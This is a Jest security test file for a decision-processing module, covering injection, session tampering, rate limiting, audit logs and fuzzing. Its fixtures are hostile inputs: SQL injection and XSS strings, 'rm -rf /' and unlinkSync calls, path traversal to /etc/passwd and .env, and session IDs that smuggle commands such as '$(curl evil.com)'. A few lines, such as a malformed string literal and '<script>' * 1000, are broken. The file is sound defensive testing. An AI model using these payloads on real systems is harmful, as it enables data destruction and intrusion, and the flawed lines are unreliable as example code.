/**
 * Security Tests for Decision Processing (Story 4.2)
 *
 * Testing security vulnerabilities and input validation
 * Critical security tests to prevent injection, tampering, and abuse
 *
 * @module review/__tests__/security-decision
 */

import { describe, it, expect, beforeEach } from '@jest/globals';
import { DecisionType, NavigationState } from '../types.js';
import { RuleSuggestion } from '../../rules/types.js';

// ============================================================================
// TEST FIXTURES
// ============================================================================

function createMockState(overrides?: Partial<NavigationState>): NavigationState {
  const mockChanges: RuleSuggestion[] = [
    {
      id: 'change-1',
      ruleId: 'rule-1',
      type: 'addition',
      priority: 'high',
      title: 'First change',
      description: 'Test change 1',
      suggestedRule: 'test rule 1',
      reasoning: 'test reasoning 1',
      confidence: 0.9,
      category: 'performance',
      tags: ['test'],
      createdAt: new Date().toISOString(),
      source: 'pattern-analysis',
      validFrom: new Date().toISOString(),
      validUntil: new Date(Date.now() + 86400000).toISOString()
    }
  ];

  return {
    currentIndex: 0,
    changes: mockChanges,
    decisions: new Map<number, DecisionType>(),
    sessionId: 'test-session-123',
    lastActivity: new Date(),
    totalChanges: 1,
    ...overrides
  };
}

// ============================================================================
// SR1: Input Validation - Command Injection
// ============================================================================

describe('SR1: Input Validation - Command Injection', () => {
  let mockState: NavigationState;

  beforeEach(() => {
    mockState = createMockState();
  });

  describe('SQL Injection Attempts', () => {
    const sqlInjectionPayloads = [
      "1; DROP TABLE decisions--",
      "1' OR '1'='1",
      "1'; DELETE FROM decisions--",
      "1' UNION SELECT * FROM users--",
      "1'; INSERT INTO decisions VALUES ('malicious')--",
      "1'; UPDATE decisions SET decision='approved'--",
      "1'; DROP DATABASE--",
      "1' OR 1=1#",
      "1' OR 1=1--",
      "1' OR 1=1/*",
      "admin'--",
      "admin'/*",
      "1 OR 1=1",
      "1' AND 1=1--",
      "1' AND 1=2--"
    ];

    it('Should reject all SQL injection attempts in change index', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      for (const payload of sqlInjectionPayloads) {
        const result = await processor.processDecision(`approve ${payload}`, mockState);

        expect(result.success).toBe(false);
        expect(result.message).not.toContain('DROP');
        expect(result.message).not.toContain('DELETE');
      }
    });

    it('Should sanitize SQL injection in command text', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      const result = await processor.processDecision(
        "1; DROP TABLE decisions; approve",
        mockState
      );

      expect(result.success).toBe(false);
      expect(result.nextState.decisions.get(1)).toBeUndefined();
    });
  });

  describe('XSS (Cross-Site Scripting) Attempts', () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      '<img src=x onerror=alert("xss")>',
      '<svg onload=alert("xss")>',
      '"><script>alert("xss")</script>',
      '<iframe src="javascript:alert(\'xss\')">',
      '<body onload=alert("xss")>',
      '<input onfocus=alert("xss") autofocus>',
      '<select onfocus=alert("xss") autofocus>',
      '<textarea onfocus=alert("xss") autofocus>',
      '<marquee onstart=alert("xss")>',
      'javascript:alert("xss")',
      '<script>document.location="http://evil.com"</script>',
      '<img src="x" onerror="document.location=\'http://evil.com\'">'
    ];

    it('Should reject all XSS attempts in commands', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      for (const payload of xssPayloads) {
        const result = await processor.processDecision(payload, mockState);

        expect(result.success).toBe(false);
        expect(result.message).not.toContain('<script>');
        expect(result.message).not.toContain('javascript:');
      }
    });

    it('Should escape HTML in command before logging', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const auditLogSpy = jest.spyOn(console, 'log').mockImplementation();
      const processor = new DecisionProcessor();

      await processor.processDecision('<script>alert(1)</script>', mockState);

      const loggedCalls = auditLogSpy.mock.calls;
      const loggedHtml = loggedCalls.some(call =>
        JSON.stringify(call).includes('<script>')
      );

      expect(loggedHtml).toBe(false);
      auditLogSpy.mockRestore();
    });
  });

  describe('Code Injection Attempts', () => {
    const codeInjectionPayloads = [
      'eval("malicious code")',
      'Function("malicious")()',
      'setTimeout("malicious")',
      'setInterval("malicious")',
      'require("child_process")',
      'process.exit(1)',
      'require("fs").unlinkSync("/")',
      '${malicious}',
      '#{malicious}',
      '%{malicious}',
      'exec("rm -rf /")',
      'system("malicious")',
      'shell_exec("malicious")',
      'passthru("malicious")'
    ];

    it('Should reject all code injection attempts', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      for (const payload of codeInjectionPayloads) {
        const result = await processor.processDecision(payload, mockState);

        expect(result.success).toBe(false);
        expect(result.message).not.toContain('eval');
        expect(result.message).not.toContain('Function');
      }
    });
  });

  describe('Path Traversal Attempts', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32',
      '/etc/passwd',
      'C:\\Windows\\System32\\config',
      '/proc/self/environ',
      '../../.env',
      '....//....//....//etc/passwd',
      '%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%2fpasswd'
    ];

    it('Should reject all path traversal attempts in index', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      for (const payload of pathTraversalPayloads) {
        const result = await processor.processDecision(`approve ${payload}`, mockState);

        expect(result.success).toBe(false);
      }
    });
  });

  describe('Command Length Validation', () => {
    it('Should reject commands longer than 1000 characters', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      const longCommand = 'a'.repeat(1001);
      const result = await processor.processDecision(longCommand, mockState);

      expect(result.success).toBe(false);
      expect(result.message).toContain('too long');
    });

    it('Should accept commands exactly 1000 characters', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      const maxCommand = 'a'.repeat(1000);
      const result = await processor.processDecision(maxCommand, mockState);

      // Should be valid length but invalid command
      expect(result.message).not.toContain('too long');
    });

    it('Should reject zero-length commands', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      const result = await processor.processDecision('', mockState);

      expect(result.success).toBe(false);
    });

    it('Should reject whitespace-only commands', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      const result = await processor.processDecision('   ', mockState);

      expect(result.success).toBe(false);
    });
  });

  describe('Special Character Sanitization', () => {
    const dangerousPatterns = [
      '<script',
      'javascript:',
      'onclick',
      'onerror',
      'onload',
      'DROP TABLE',
      'eval(',
      'exec(',
      'system(',
      '${',
      '#{',
      '`'
    ];

    it('Should sanitize dangerous patterns', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      for (const pattern of dangerousPatterns) {
        const result = await processor.processDecision(
          `approve 1 ${pattern}`,
          mockState
        );

        // Should either reject or sanitize
        if (result.success) {
          expect(result.message).not.toContain(pattern);
        }
      }
    });
  });
});

// ============================================================================
// SR2: Session Integrity
// ============================================================================

describe('SR2: Session Integrity', () => {
  describe('HMAC Signature Validation', () => {
    it('Should reject decisions from tampered sessions', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const { StateManager } = await import('../state-manager.js');
      const processor = new DecisionProcessor();
      const stateManager = new StateManager();

      // Create valid session
      const validState = createMockState();
      await stateManager.saveState(validState);

      // Tamper with session
      const tamperedState = createMockState({
        sessionId: validState.sessionId,
        signature: 'invalid-signature'
      });

      const result = await processor.processDecision('approve 1', tamperedState);

      expect(result.success).toBe(false);
      expect(result.message).toContain('invalid session');
    });

    it('Should validate session ownership before processing decisions', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      const invalidState = createMockState({
        sessionId: 'non-existent-session'
      });

      const result = await processor.processDecision('approve 1', invalidState);

      expect(result.success).toBe(false);
    });

    it('Should detect and reject replay attacks', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      const state = createMockState({
        sessionId: 'old-session-token'
      });

      const result = await processor.processDecision('approve 1', state);

      expect(result.success).toBe(false);
      expect(result.message).toContain('replay') || expect(result.message).toContain('expired');
    });
  });

  describe('Session Hijacking Prevention', () => {
    it('Should reject decisions with invalid session IDs', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      const invalidSessionIds = [
        '',
        'null',
        'undefined',
        '../../etc/passwd',
        '<script>alert(1)</script>',
        ''; DROP TABLE sessions;--',
        'admin-session',
        'root-session',
        '../../../etc/passwd'
      ];

      for (const sessionId of invalidSessionIds) {
        const state = createMockState({ sessionId });
        const result = await processor.processDecision('approve 1', state);

        expect(result.success).toBe(false);
      }
    });

    it('Should validate session format', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      const malformedSessionIds = [
        'spaces in session',
        'session\nwith\nnewlines',
        'session\twith\ttabs',
        'session;with;semicolons',
        'session|with|pipes',
        'session&with&ampersands',
        'session$(whoami)',
        'session`uname -a`',
        'session$(curl evil.com)',
        '\x00\x01\x02\x03'
      ];

      for (const sessionId of malformedSessionIds) {
        const state = createMockState({ sessionId });
        const result = await processor.processDecision('approve 1', state);

        expect(result.success).toBe(false);
      }
    });
  });
});

// ============================================================================
// SR3: Rate Limiting
// ============================================================================

describe('SR3: Rate Limiting', () => {
  let mockState: NavigationState;

  beforeEach(() => {
    mockState = createMockState();
  });

  describe('Token Bucket Rate Limiting', () => {
    it('Should allow up to 30 decisions per minute', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      const results = [];
      for (let i = 0; i < 30; i++) {
        const result = await processor.processDecision('approve 1', mockState);
        results.push(result);
      }

      const successful = results.filter(r => r.success);
      expect(successful.length).toBe(30);
    });

    it('Should throttle the 31st decision', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      const results = [];
      for (let i = 0; i < 35; i++) {
        const result = await processor.processDecision('approve 1', mockState);
        results.push(result);
      }

      const rateLimited = results.filter(r =>
        !r.success && r.message?.includes('Rate limit')
      );

      expect(rateLimited.length).toBeGreaterThan(0);
    });

    it('Should warn user about high decision rate', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      const results = [];
      for (let i = 0; i < 35; i++) {
        const result = await processor.processDecision('approve 1', mockState);
        results.push(result);
      }

      const warnings = results.filter(r =>
        r.message?.includes('High decision rate') || r.message?.includes('carefully')
      );

      expect(warnings.length).toBeGreaterThan(0);
    });

    it('Should use token bucket algorithm for smooth enforcement', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      // Make 10 rapid decisions
      for (let i = 0; i < 10; i++) {
        const result = await processor.processDecision('approve 1', mockState);
        expect(result.success).toBe(true);
      }

      // Wait a bit for token refill
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Should still allow decisions (tokens refilled)
      const result = await processor.processDecision('approve 1', mockState);
      expect(result.success).toBe(true);
    });
  });

  describe('Rate Limit Per-Session Enforcement', () => {
    it('Should track rate limits separately per session', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      const state1 = createMockState({ sessionId: 'session-1' });
      const state2 = createMockState({ sessionId: 'session-2' });

      // Exhaust session 1 rate limit
      for (let i = 0; i < 35; i++) {
        await processor.processDecision('approve 1', state1);
      }

      // Session 2 should still work
      const result = await processor.processDecision('approve 1', state2);
      expect(result.success).toBe(true);
    });
  });

  describe('Rate Limit Recovery', () => {
    it('Should implement exponential backoff for recovery', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      // Exhaust rate limit
      for (let i = 0; i < 35; i++) {
        await processor.processDecision('approve 1', mockState);
      }

      // Wait for recovery
      await new Promise(resolve => setTimeout(resolve, 5000));

      // Should allow decisions again
      const result = await processor.processDecision('approve 1', mockState);
      expect(result.success).toBe(true);
    });
  });
});

// ============================================================================
// SR4: Audit Trail Security
// ============================================================================

describe('SR4: Audit Trail Security', () => {
  describe('Append-Only Audit Log', () => {
    it('Should prevent modification of existing audit entries', async () => {
      const { AuditLogger } = await import('../audit-logger.js');
      const logger = new AuditLogger();

      await logger.logDecision({
        sessionId: 'test-session',
        action: 'approve',
        changeIndex: 1,
        decision: DecisionType.APPROVED,
        timestamp: new Date().toISOString()
      });

      // Try to modify audit log (should fail or be detected)
      const logs = await logger.getLogs('test-session');
      expect(logs).toHaveLength(1);
      expect(logs[0].decision).toBe(DecisionType.APPROVED);
    });

    it('Should detect tampering with audit file', async () => {
      const { AuditLogger } = await import('../audit-logger.js');
      const logger = new AuditLogger();

      await logger.logDecision({
        sessionId: 'test-session',
        action: 'approve',
        changeIndex: 1,
        decision: DecisionType.APPROVED,
        timestamp: new Date().toISOString(),
        checksum: 'invalid-checksum'
      });

      const logs = await logger.getLogs('test-session');

      // Should detect invalid checksum
      expect(logs[0]).toHaveProperty('checksum');
    });
  });

  describe('Audit Log Rotation', () => {
    it('Should rotate audit logs when size exceeds 100MB', async () => {
      // This test verifies rotation logic exists
      const { AuditLogger } = await import('../audit-logger.js');
      const logger = new AuditLogger();

      // Mock large log file
      const rotateSpy = jest.spyOn(logger as any, 'rotateLogIfNeeded');

      await logger.logDecision({
        sessionId: 'test-session',
        action: 'approve',
        changeIndex: 1,
        decision: DecisionType.APPROVED,
        timestamp: new Date().toISOString()
      });

      // Should check rotation
      expect(rotateSpy).toHaveBeenCalled();
    });

    it('Should compress audit logs after 7 days', async () => {
      const { AuditLogger } = await import('../audit-logger.js');
      const logger = new AuditLogger();

      const compressSpy = jest.spyOn(logger as any, 'compressOldLogs');

      await logger.logDecision({
        sessionId: 'test-session',
        action: 'approve',
        changeIndex: 1,
        decision: DecisionType.APPROVED,
        timestamp: new Date().toISOString()
      });

      // Should check for old logs to compress
      expect(compressSpy).toHaveBeenCalled();
    });
  });
});

// ============================================================================
// SR5: Error Handling Security
// ============================================================================

describe('SR5: Error Handling Security', () => {
  describe('Security Error Messages', () => {
    it('Should not expose system internals in error messages', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      const state = createMockState();
      const result = await processor.processDecision('../../../etc/passwd', state);

      expect(result.message).not.toContain('/etc/');
      expect(result.message).not.toContain('Error:');
      expect(result.message).not.toContain('stack trace');
      expect(result.message).not.toContain('__dirname');
      expect(result.message).not.toContain('process.cwd');
    });

    it('Should log security violations separately', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const securityLogSpy = jest.spyOn(console, 'error').mockImplementation();
      const processor = new DecisionProcessor();

      const state = createMockState();
      await processor.processDecision('1; DROP TABLE', state);

      const securityCalls = securityLogSpy.mock.calls.filter(call =>
        JSON.stringify(call).includes('security')
      );

      expect(securityCalls.length).toBeGreaterThan(0);
      securityLogSpy.mockRestore();
    });
  });

  describe('Graceful Degradation', () => {
    it('Should continue functioning after security violations', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      const state = createMockState();

      // Multiple violations
      await processor.processDecision('<script>', state);
      await processor.processDecision('1; DROP TABLE', state);
      await processor.processDecision('../../../etc/passwd', state);

      // Should still work with valid input
      const result = await processor.processDecision('approve 1', state);
      expect(result.success).toBe(true);
    });

    it('Should not crash on malicious input', async () => {
      const { DecisionProcessor } = await import('../decision-processor.js');
      const processor = new DecisionProcessor();

      const state = createMockState();
      const maliciousInputs = [
        null,
        undefined,
        '\x00\x01\x02',
        '💀💀💀💀💀',
        '<script>' * 1000,
        'a'.repeat(10000)
      ];

      for (const input of maliciousInputs) {
        expect(async () => {
          await processor.processDecision(input as any, state);
        }).not.toThrow();
      }
    });
  });
});

// ============================================================================
// Fuzzing Tests
// ============================================================================

describe('Fuzzing Tests', () => {
  let mockState: NavigationState;

  beforeEach(() => {
    mockState = createMockState();
  });

  it('Should handle 1000 random malformed inputs without crashing', async () => {
    const { DecisionProcessor } = await import('../decision-processor.js');
    const processor = new DecisionProcessor();

    const randomChars = () => String.fromCharCode(Math.floor(Math.random() * 65536));
    const randomString = (length: number) =>
      Array.from({ length }, randomChars).join('');

    for (let i = 0; i < 1000; i++) {
      const input = randomString(Math.floor(Math.random() * 1000));

      expect(async () => {
        await processor.processDecision(input, mockState);
      }).not.toThrow();
    }
  });

  it('Should handle unicode edge cases', async () => {
    const { DecisionProcessor } = await import('../decision-processor.js');
    const processor = new DecisionProcessor();

    const unicodeInputs = [
      '\u0000\u0001\u0002',
      '\u200B\u200C\u200D', // Zero-width characters
      '\uFEFF\uFFFE\uFFFF', // BOM and non-characters
      '🚀💀🎉💻🔥', // Emoji
      'مرحبا', // Arabic
      '你好', // Chinese
      'こんにちは', // Japanese
      '안녕하세요', // Korean
      'שלום', // Hebrew
      'Привет', // Cyrillic
      'Γειά σου', // Greek
      '\uD800\uDC00', // Surrogate pair
      '\uDC00\uD800' // Invalid surrogate pair
    ];

    for (const input of unicodeInputs) {
      expect(async () => {
        await processor.processDecision(input, mockState);
      }).not.toThrow();
    }
  });
});
